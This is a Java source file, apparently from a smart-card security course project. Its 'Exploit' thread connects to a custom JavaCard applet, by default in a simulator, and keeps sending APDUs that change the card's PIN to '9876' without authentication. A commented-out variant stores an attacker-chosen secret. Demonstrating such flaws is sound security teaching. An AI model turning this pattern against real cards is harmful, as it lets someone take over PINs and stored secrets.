package tool;

import applet.CardSmartApplet;
import cardTools.CardManager;
import cardTools.RunConfig;
import cardTools.Util;

import javax.smartcardio.CardException;
import javax.smartcardio.CommandAPDU;
import javax.smartcardio.ResponseAPDU;
import java.util.Arrays;

@SuppressWarnings({"DuplicatedCode", "SameParameterValue"})
public class Exploit extends Thread {
    private static final boolean simulator = true;

    public void run() {
        this.sleep(2000);
        System.out.println("[Exploit] Waiting for a card to connect");
        CardManager cardMngr = Exploit.getCardMngr();
        if (cardMngr == null) {
            System.out.println("[Exploit] Failed to connect");
            return;
        }

        System.out.println("[Exploit] Card connected");
        System.out.println("[Exploit] Trying to save");
        while (true) {
            try {
                // The attacker can choose what to do, e.g. store a new secret/read existing secret or even change PIN
                /*
                if (Exploit.cardStoreSecret(cardMngr)) {
                    break;
                }
                */
                if (Exploit.cardChangePIN(cardMngr)) {
                    break;
                }
            } catch (CardException ignored) {
            }
            this.sleep(1000);
        }
        System.out.println("[Exploit] Exploited");
    }

    /**
     * Returns CardManager instance of real or simulated card.
     * Returned instance type depends on Main.simulator variable.
     * Returned instance is already connected to the card and SELECT APDU was sent.
     */
    private static CardManager getCardMngr() {
        CardManager cardMngr = new CardManager(false, Util.hexStringToByteArray("63617264736D6172746170706C6574"));
        final RunConfig runCfg = RunConfig.getDefaultConfig();
        if (simulator) {
            runCfg.setAppletToSimulate(CardSmartApplet.class);
            runCfg.setTestCardType(RunConfig.CARD_TYPE.JCARDSIMLOCAL); // Use simulator
        } else {
            runCfg.setTestCardType(RunConfig.CARD_TYPE.PHYSICAL); // Use real card
        }

        // Connect to first available card
        // NOTE: selects target applet based on AID specified in CardManager constructor
        System.out.print("[Exploit] Connecting to card...");
        try {
            if (!cardMngr.Connect(runCfg)) {
                return null;
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        System.out.println(" exploit connected.");
        return cardMngr;
    }

    private static boolean cardStoreSecret(CardManager cardMngr) throws CardException {
        byte[] r = Arguments.concat(new byte[]{(byte) "exploit".length()}, "exploit".getBytes(),
                new byte[]{(byte) "hacked".length()}, "hacked".getBytes());
        byte[] data = Arrays.copyOf(r, 44);
        ResponseAPDU response = cardMngr.transmit(buildAPDU(0x25, data));
        return processResponse(response) != null;
    }

    public static byte[] padBytes(byte[] PIN, int len) {
        return Arrays.copyOf(PIN, len);
    }

    private static boolean cardChangePIN(CardManager cardMngr) throws CardException {
        ResponseAPDU response = cardMngr.transmit(buildAPDU(0x23, Exploit.padBytes(new byte[]{'9', '8', '7', '6'}, 10)));
        if (processResponse(response) != null) {
            System.out.println("PIN changed");
            return true;
        }
        return false;
    }

    private static byte[] processResponse(ResponseAPDU response) {
        if (response.getSW() != 0x9000) {
            return null;
        }
        return response.getData();
    }

    private static CommandAPDU buildAPDU(int ins, byte[] data) {
        return new CommandAPDU(0xB0, ins, 0x00, 0x00, data);
    }

    private void sleep(int m) {
        try {
            Thread.sleep(m);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
